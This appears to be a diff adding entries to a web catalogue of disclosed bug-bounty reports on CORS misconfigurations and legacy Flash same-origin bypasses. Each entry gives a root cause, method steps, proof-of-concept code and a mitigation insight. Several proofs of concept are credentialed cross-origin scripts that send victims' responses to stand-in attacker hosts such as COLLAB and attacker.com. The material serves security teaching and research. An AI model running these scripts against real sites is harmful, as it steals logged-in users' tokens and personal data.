+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1183601" target="_blank" rel="noopener">hackerone.com/reports/1183601</a></span><a class="src" href="#report-1183601" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-733017" style="--sv:var(--sev-high)" data-sev="3" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Credentialed CORS with reflected Origin leaks API tokens</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#733017</b> · deptofdefense · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The server reflects the request Origin into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials: true, so any attacker-controlled origin can read authenticated responses (including a token-list endpoint) using the victim's cookies.</p>
+<h4>Method</h4><ol><li>Send a request with a random Origin header and check for Access-Control-Allow-Origin echoing it back plus Access-Control-Allow-Credentials: true.</li><li>Host a page that does a credentialed XHR (withCredentials=true) to a sensitive endpoint (e.g. /api/token/list).</li><li>Read the cross-origin response and exfiltrate API keys / PII to the attacker server.</li></ol>
+<div class="pre">&lt;script&gt;
+  var x=new XMLHttpRequest();
+  x.open('GET','https://TARGET/api/token/list',true);
+  x.withCredentials=true;
+  x.onload=function(){new Image().src='https://COLLAB/?d='+btoa(x.responseText)};
+  x.send();
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> The dangerous combo is reflected-origin ACAO + ACAC:true. A wildcard '*' cannot be combined with credentials, so programs that need cookies often reflect the Origin instead - always probe with a junk Origin and look for it echoed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/733017" target="_blank" rel="noopener">hackerone.com/reports/733017</a></span><a class="src" href="#report-733017" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-10373" style="--sv:var(--sev-high)" data-sev="3" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Same-Origin Policy bypass: alphanumeric SWF smuggled through a JSONP callback</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#10373</b> · ibb · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>JSONP reflection -&gt; SWF content-type confusion -&gt; SOP </b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A JSONP endpoint lets the caller control the first bytes of the response (the callback name). Because Flash ignores trailing bytes after a valid SWF and a whole SWF can be DEFLATE-encoded into the [A-Za-z0-9] range, an attacker passes a full SWF as the callback; the browser loads it in the JSONP domain's security context and can then make credentialed same-origin requests and read responses.</p>
+<h4>Method</h4><ol><li>Find a JSONP endpoint that reflects the callback param at the start of the response and only filters it to [A-Za-z0-9]</li><li>Build a valid SWF whose bytes are all alphanumeric (ascii-zip DEFLATE trick); trailing JSON is ignored by Flash</li><li>Embed it via &lt;object data="https://target/jsonp?callback=&lt;ALNUM_SWF&gt;"&gt; with AllowScriptAccess=always</li><li>The SWF runs as target-origin and proxies authenticated cross-origin reads to the attacker</li></ol>
+<div class="pre">&lt;object type="application/x-shockwave-flash"
+        data="https://TARGET/jsonp-api?callback=__ALNUM_SWF__"&gt;
+  &lt;param name="AllowScriptAccess" value="always"&gt;
+&lt;/object&gt;
+# response: __SWF_FILE__({"actual":"API","response":15})  &lt;-- trailing JSON ignored by Flash</div>
+<p class="insight"><b>Insight —</b> Content that starts with attacker-controlled bytes and is served same-origin can be reinterpreted as an executable format (SWF, and historically PDF/HTML sniffing). Even a legacy JSONP endpoint becomes a full SOP-bypass primitive. Mitigations that generalize: prefix JSONP with an empty callback/comment, or host JSONP on a sandbox domain with no crossdomain.xml trust back.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/10373" target="_blank" rel="noopener">hackerone.com/reports/10373</a></span><a class="src" href="#report-10373" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-102234" style="--sv:var(--sev-high)" data-sev="3" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SOP bypass via a permissive CDN SWF trusted by crossdomain.xml</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#102234</b> · ok · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>ok</b></span><span>Surface <b>web</b></span><span>Chain <b>crossdomain.xml trust -&gt; permissive CDN SWF (allowDomain(</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The main domain's crossdomain.xml trusts a CDN host that serves a SWF using Security.allowDomain('*') and loads an attacker-controlled external SWF via an uncontrolled vpaidSwfUrl parameter. The loaded SWF therefore runs in the CDN origin, which crossdomain trust lets read the main domain.</p>
+<h4>Method</h4><ol><li>Read target crossdomain.xml to list trusted domains</li><li>Find a SWF on any trusted domain that calls Security.allowDomain('*') and takes a URL param that loads/executes another SWF</li><li>Host a malicious SWF; pass its URL in the vulnerable param (e.g. vpaidSwfUrl)</li><li>From the trusted origin, request main-domain authenticated pages and exfiltrate to attacker JS</li></ol>
+<div class="pre">http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ATTACKER/ok.swf?url=http://ok.ru/settings&amp;Loader=test
+// ok.swf reads http://ok.ru/settings and posts innerHTML to attacker-controlled origin</div>
+<p class="insight"><b>Insight —</b> Audit crossdomain.xml, then hunt the trusted hosts for old SWFs that combine allowDomain('*') with a URL param that loads external Flash. Legacy Flash SOP bypasses persist wherever crossdomain trust + a permissive SWF loader still exist. Decompile candidate SWFs (Flashbang/JPEXS) to confirm the parameter is passed to Loader.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/102234" target="_blank" rel="noopener">hackerone.com/reports/102234</a></span><a class="src" href="#report-102234" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-426165" style="--sv:var(--sev-med)" data-sev="2" data-votes="245" data-bounty="550">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Origin reflection with weak substring match -&gt; credentialed cross-origin read</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#426165</b> · eternal · 550 · 245 votes · resolved</div>
+<div class="taxo"><span>Program <b>eternal</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The server reflected an arbitrary Origin into Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true; the allowlist check was a substring/regex that an attacker domain (developersxzomato.com) satisfied, enabling authenticated cross-origin reads.</p>
+<h4>Method</h4><ol><li>Send request with a crafted Origin header</li><li>Check if it is reflected in ACAO with ACAC:true</li><li>Register a domain that satisfies the sloppy match and host an exploit page</li></ol>
+<div class="pre">Origin: developersxzomato.com   -&gt;   Access-Control-Allow-Origin: developersxzomato.com
+Access-Control-Allow-Credentials: true
+// PoC:
+var r=new XMLHttpRequest();r.open('get','https://www.zomato.com/abudhabi',true);r.withCredentials=true;r.send();</div>
+<p class="insight"><b>Insight —</b> When ACAO reflects Origin with credentials, test bypass domains: attacker-prefixed (targetX.com), attacker-suffixed (target.com.evil.com), and substring matches. A registerable domain that passes the check reads victim data.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/426165" target="_blank" rel="noopener">hackerone.com/reports/426165</a></span><a class="src" href="#report-426165" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-629892" style="--sv:var(--sev-med)" data-sev="2" data-votes="139" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS reflects any subdomain and allows http scheme -&gt; profile/email leak</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#629892</b> · superhuman · awarded · 139 votes · resolved</div>
+<div class="taxo"><span>Program <b>superhuman</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The ACAO check reflects any *.grammarly.com origin and accepts the insecure http scheme while ACAC is true; a MITM (or any controllable subdomain) can read credentialed responses like /profile containing email and settings.</p>
+<h4>Method</h4><ol><li>Send Origin: http://www.TARGET.com (or attacker.TARGET.com) with a credentialed request</li><li>Observe Access-Control-Allow-Origin reflects it and Allow-Credentials: true</li><li>From a MITM-injected/evil subdomain page, XHR withCredentials to the sensitive endpoint and read the body</li></ol>
+<div class="pre">var x=new XMLHttpRequest();
+x.open('GET','https://g-mail.grammarly.com/profile',true);
+x.withCredentials=true;
+x.onload=()=&gt;console.log(x.responseText); // {id,email,...}
+x.send();</div>
+<p class="insight"><b>Insight —</b> Test CORS with Origin variations: arbitrary subdomain, http:// downgrade, null. Reflection + Allow-Credentials on any of them = credentialed data theft (and via http, a MITM can forge the trusted origin).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/629892" target="_blank" rel="noopener">hackerone.com/reports/629892</a></span><a class="src" href="#report-629892" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-235200" style="--sv:var(--sev-med)" data-sev="2" data-votes="97" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS reflects arbitrary Origin with Allow-Credentials:true -&gt; cross-origin data theft</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#235200</b> · semrush · awarded · 97 votes · resolved</div>
+<div class="taxo"><span>Program <b>semrush</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The API echoes the request Origin into Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: true, so any attacker origin can make credentialed cross-origin reads of the victim's authenticated JSON.</p>
+<h4>Method</h4><ol><li>Send a request with a random Origin header and check whether the response reflects it in Access-Control-Allow-Origin with Allow-Credentials: true.</li><li>Host a page that issues a credentialed XHR/fetch (withCredentials) to the sensitive authed endpoint.</li><li>Lure a logged-in victim; read the cross-origin response and exfiltrate it.</li></ol>
+<div class="pre">var req = new XMLHttpRequest();
+req.onload = function(){ /* exfil this.responseText */ };
+req.open('GET','https://TARGET/api/rest/1.2/users/ID/projects',true);
+req.withCredentials = true;
+req.send();</div>
+<p class="insight"><b>Insight —</b> Test CORS by sending Origin: https://evil.example and looking for reflection + Allow-Credentials:true. Also test null origin and subdomain/regex trust. Reflected-origin + credentials = read any authed endpoint from an attacker page. Fix = allowlist, never reflect.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/235200" target="_blank" rel="noopener">hackerone.com/reports/235200</a></span><a class="src" href="#report-235200" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-958459" style="--sv:var(--sev-med)" data-sev="2" data-votes="26" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS origin reflection with credentials</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#958459</b> · acronis · none · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Server reflects arbitrary request Origin into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials: true, so any site can read authenticated cross-origin responses.</p>
+<h4>Method</h4><ol><li>Send a request adding an arbitrary Origin header</li><li>Confirm the response echoes the same Origin in ACAO with ACAC:true</li><li>Host attacker JS that fetches the endpoint with credentials:'include' and exfiltrates the body</li></ol>
+<div class="pre">GET /wp-json HTTP/1.1
+Host: TARGET
+Origin: https://evil.com
+
+--&gt; Response:
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true</div>
+<p class="insight"><b>Insight —</b> Whenever ACAO reflects your Origin AND ACAC is true, it is exploitable regardless of the wildcard-looking config; test with a junk Origin and check for exact reflection + credentials.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/958459" target="_blank" rel="noopener">hackerone.com/reports/958459</a></span><a class="src" href="#report-958459" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1005374" style="--sv:var(--sev-med)" data-sev="2" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected-Origin CORS with credentials</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1005374</b> · deptofdefense · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The endpoint reflects an arbitrary Origin into Access-Control-Allow-Origin while also setting Access-Control-Allow-Credentials: true, letting any attacker origin read authenticated responses.</p>
+<h4>Method</h4><ol><li>Send a request with Origin: evil.com</li><li>Confirm response reflects ACAO: evil.com and ACAC: true</li><li>Host a page on an attacker origin that does a credentialed XHR/fetch and reads the body</li></ol>
+<div class="pre">GET /wp-json/wp/v2/ HTTP/1.1
+Origin: http://evil.com
+--- response ---
+Access-Control-Allow-Origin: http://evil.com
+Access-Control-Allow-Credentials: true
+
+&lt;!-- exploit --&gt;
+&lt;script&gt;
+var x=new XMLHttpRequest();
+x.onload=()=&gt;fetch('//attacker/?d='+btoa(x.responseText));
+x.open('GET','https://TARGET/wp-json/wp/v2/',true);
+x.withCredentials=true;x.send();
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Always test CORS with a junk Origin and check for ACAO reflection plus ACAC:true. The combination is exploitable cross-origin credentialed data theft; null Origin and trusted-suffix bypasses are the next tests.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1005374" target="_blank" rel="noopener">hackerone.com/reports/1005374</a></span><a class="src" href="#report-1005374" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-896093" style="--sv:var(--sev-med)" data-sev="2" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected Origin + credentials CORS misconfiguration</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#896093</b> · deptofdefense · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The /wp-json API reflects any supplied Origin into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials: true, letting a malicious page read authenticated responses cross-origin.</p>
+<h4>Method</h4><ol><li>Send a request with Origin: http://evil.com and observe ACAO reflects it with ACAC:true</li><li>Host a page that XHRs the endpoint withCredentials</li><li>Exfiltrate the authenticated response to the attacker server</li></ol>
+<div class="pre">GET /wp-json HTTP/1.1
+Origin: http://evil.com
+--&gt;
+Access-Control-Allow-Origin: http://evil.com
+Access-Control-Allow-Credentials: true</div>
+<p class="insight"><b>Insight —</b> ACAO reflecting the request Origin together with ACAC:true is exploitable credentialed CORS. Always test with a junk Origin - if it is echoed back and credentials are allowed, you can read the victim's authenticated data.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/896093" target="_blank" rel="noopener">hackerone.com/reports/896093</a></span><a class="src" href="#report-896093" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1199527" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected-origin CORS with credentials on authenticated endpoint</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1199527</b> · upchieve · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>upchieve</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The server reflects any supplied Origin into Access-Control-Allow-Origin and returns Access-Control-Allow-Credentials: true, so a malicious site can read authenticated responses of a logged-in victim cross-origin.</p>
+<h4>Method</h4><ol><li>Send a request with an arbitrary Origin header to an authenticated endpoint (e.g. /dashboard)</li><li>Observe access-control-allow-origin echoes the Origin and access-control-allow-credentials: true</li><li>Host attacker JS that fetches the endpoint with credentials:'include' and exfiltrates the response</li></ol>
+<div class="pre">GET /dashboard HTTP/1.1\nHost: app.upchieve.org\nOrigin: https://attacker.example\n\n\n--&gt; access-control-allow-origin: https://attacker.example\naccess-control-allow-credentials: true</div>
+<p class="insight"><b>Insight —</b> Test every authenticated endpoint by sending a random Origin: reflection + ACAC:true = cross-origin account data theft. Null origin and subdomain trust variants are worth testing too.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1199527" target="_blank" rel="noopener">hackerone.com/reports/1199527</a></span><a class="src" href="#report-1199527" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-995144" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Origin-reflecting CORS with credentials -&gt; cross-origin data theft</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#995144</b> · deptofdefense · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Server reflects the request Origin into Access-Control-Allow-Origin and also returns Access-Control-Allow-Credentials: true, letting any attacker origin read authenticated responses.</p>
+<h4>Method</h4><ol><li>Send a request with a foreign Origin header and observe ACAO reflects it plus ACAC:true.</li><li>Host a page that XHR/fetches the sensitive endpoint with withCredentials=true.</li><li>Exfiltrate the authenticated response body to attacker server.</li></ol>
+<div class="pre">GET /sensitive HTTP/1.1
+Host: target
+Origin: http://attacker.com
+
+--&gt; Access-Control-Allow-Origin: http://attacker.com
+    Access-Control-Allow-Credentials: true
+
+&lt;script&gt;
+var x=new XMLHttpRequest();
+x.open('GET','https://target/sensitive',true);
+x.withCredentials=true;
+x.onload=function(){fetch('http://attacker.com/?d='+btoa(x.responseText))};
+x.send();
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Always send a junk Origin header on authenticated endpoints. Reflection of Origin + ACAC:true is instantly exploitable; also test null Origin, sub-string/suffix matching (target.com.evil.com), and trusted-subdomain takeover as CORS bypasses.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/995144" target="_blank" rel="noopener">hackerone.com/reports/995144</a></span><a class="src" href="#report-995144" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1092125" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS misconfig on WordPress wp-json enables credentialed cross-origin read</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1092125</b> · deptofdefense · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The site reflects/accepts arbitrary Origins with Access-Control-Allow-Credentials: true, so any attacker page can issue withCredentials XHR to endpoints like /wp-json/wp/v2/users/ and read the JSON response (user IDs, names, login usernames) across origin.</p>
+<h4>Method</h4><ol><li>Find a REST endpoint returning data (WordPress /wp-json/wp/v2/users/)</li><li>Send a request with Origin: evil.com and confirm response echoes ACAO: evil.com + ACAC: true</li><li>Host an HTML page that does a withCredentials XMLHttpRequest to the endpoint</li><li>Victim visits the page; response body is read cross-origin and exfiltrated</li></ol>
+<div class="pre">&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = function(){ /* exfil this.responseText */ };
+req.open('GET','https://TARGET/wp-json/wp/v2/users/', true);
+req.withCredentials = true;
+req.send();
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Whenever a response returns Access-Control-Allow-Origin reflecting the request Origin AND Access-Control-Allow-Credentials: true, it is exploitable - any origin can read authenticated responses. Probe with Origin: evil.com and check both headers; on WordPress, /wp-json/wp/v2/users/ is a quick user-enumeration target.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1092125" target="_blank" rel="noopener">hackerone.com/reports/1092125</a></span><a class="src" href="#report-1092125" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-412490" style="--sv:var(--sev-med)" data-sev="2" data-votes="33" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS trusting browser-extension origins lets a malicious extension impersonate the user</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#412490</b> · superhuman · awarded · 33 votes · resolved</div>
+<div class="taxo"><span>Program <b>superhuman</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">CORS/CSRF handling trusts requests originating from browser-extension origins interacting with the app domain, so any extension with host permission for that domain can perform authenticated cross-origin actions as the user.</p>
+<h4>Method</h4><ol><li>Identify that the app's CORS/CSRF policy trusts extension origins for its domain</li><li>From an extension with grammarly.com host permission, issue credentialed requests to the app</li><li>Impersonate the user / act on their behalf</li></ol>
+<p class="insight"><b>Insight —</b> When auditing CORS allow-lists, check whether chrome-extension://, moz-extension:// or wildcarded extension origins are trusted. Extensions run in many users' browsers and become a delegated CSRF/CORS vector.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/412490" target="_blank" rel="noopener">hackerone.com/reports/412490</a></span><a class="src" href="#report-412490" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-769058" style="--sv:var(--sev-low)" data-sev="1" data-votes="46" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Origin-reflecting CORS with credentials -&gt; cross-origin data theft</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#769058</b> · semrush · awarded · 46 votes · resolved</div>
+<div class="taxo"><span>Program <b>semrush</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An authenticated JSON endpoint reflected an arbitrary request Origin into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials: true, letting any site read the victim's authenticated response.</p>
+<h4>Method</h4><ol><li>Find an authenticated JSON endpoint</li><li>Send a cross-origin request with an arbitrary Origin and observe ACAO reflects it and ACAC:true</li><li>Host JS on attacker site that fetches the endpoint withCredentials</li><li>Read the victim's data cross-origin</li></ol>
+<div class="pre">var x=new XMLHttpRequest();
+x.onload=function(){ fetch('//attacker.tld/log?d='+encodeURIComponent(x.response)); };
+x.open('GET','https://www.semrush.com/content-paywall/api/accesslevel',true);
+x.withCredentials=true;
+x.send();</div>
+<p class="insight"><b>Insight —</b> Test every credentialed endpoint with a foreign Origin header. If ACAO echoes it (or is null) alongside ACAC:true, it is exploitable - reflect-origin plus credentials is the exact broken combination.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/769058" target="_blank" rel="noopener">hackerone.com/reports/769058</a></span><a class="src" href="#report-769058" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-372452" style="--sv:var(--sev-low)" data-sev="1" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Credentialed CORS on a WebSocket/socket.io polling endpoint</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#372452</b> · infogram · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>infogram</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The socket.io endpoint reflects the request Origin and allows credentials, so a malicious page can issue a withCredentials cross-origin request and read the authenticated victim's session data.</p>
+<h4>Method</h4><ol><li>Confirm the endpoint reflects arbitrary Origin with Access-Control-Allow-Credentials: true</li><li>Host a page that does a withCredentials XHR to the endpoint</li><li>Read the response cross-origin from the victim's authenticated session</li></ol>
+<div class="pre">&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = function(){ alert(this.responseText); };
+req.open('get','https://ws.infogram.com/socket.io/?EIO=3&amp;transport=polling&amp;t=MH7BU79',true);
+req.withCredentials = true;
+req.send();
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> socket.io/long-polling and other 'API' subdomains are often overlooked in CORS audits. Test Origin reflection + ACAC:true on WS handshake and polling endpoints; a valid PoC needs withCredentials and a reflected/allow-listed origin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/372452" target="_blank" rel="noopener">hackerone.com/reports/372452</a></span><a class="src" href="#report-372452" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2332728" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Credentialed CORS: reflected Origin + Access-Control-Allow-Credentials:true</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2332728</b> · publitas · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>publitas</b></span><span>Surface <b>web</b></span><span>Chain <b>CORS misconfig -&gt; credentialed cross-origin read -&gt; se</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The server reflects an arbitrary request Origin into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials: true, so any attacker page can issue withCredentials requests and read authenticated responses cross-origin.</p>
+<h4>Method</h4><ol><li>Send a request with a random/attacker Origin header to the target (WP-JSON / API endpoint)</li><li>Confirm the response echoes that exact Origin in ACAO and includes ACAC: true</li><li>Host an HTML page that fetches the endpoint with withCredentials and exfiltrates responseText</li><li>Lure an authenticated victim to the page</li></ol>
+<div class="pre">&lt;script&gt;
+ var x = new XMLHttpRequest();
+ x.onreadystatechange = function(){ if(this.readyState==4&amp;&amp;this.status==200){ /* exfil */ new Image().src='https://COLLAB/?d='+btoa(this.responseText); } };
+ x.open('GET','https://TARGET/wp-json/…',true);
+ x.withCredentials = true;
+ x.send();
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Detection is one probe: send Origin: https://evil.example and check whether ACAO reflects it AND ACAC:true is present. Reflected-origin + credentials = readable authenticated data cross-origin. Also test null origin (sandboxed iframe/data: URI) and trusted-suffix bypasses (evil-target.com, target.com.evil.com).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2332728" target="_blank" rel="noopener">hackerone.com/reports/2332728</a></span><a class="src" href="#report-2332728" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-7571" style="--sv:var(--sev-low)" data-sev="1" data-votes="1" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Overly permissive Silverlight cross-domain policy (clientaccesspolicy.xml wildcard)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#7571</b> · automattic · none · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app publishes a Silverlight clientaccesspolicy.xml that allows all domains and all request headers, so any origin can make two-way authenticated cross-domain requests to the app on behalf of a logged-in user.</p>
+<h4>Method</h4><ol><li>Fetch /clientaccesspolicy.xml (Silverlight) and /crossdomain.xml (Flash) on the target.</li><li>Look for wildcard grants: &lt;domain uri="http://*"/&gt; / allow-from http-request-headers="*".</li><li>If present, any attacker origin can read authenticated responses (cross-domain) using a Silverlight/Flash client in the victim's session.</li></ol>
+<div class="pre">&lt;!-- https://app.TARGET.com/clientaccesspolicy.xml --&gt;
+&lt;allow-from http-request-headers="*"&gt;
+  &lt;domain uri="http://*"/&gt;
+  &lt;domain uri="https://*"/&gt;
+&lt;/allow-from&gt;</div>
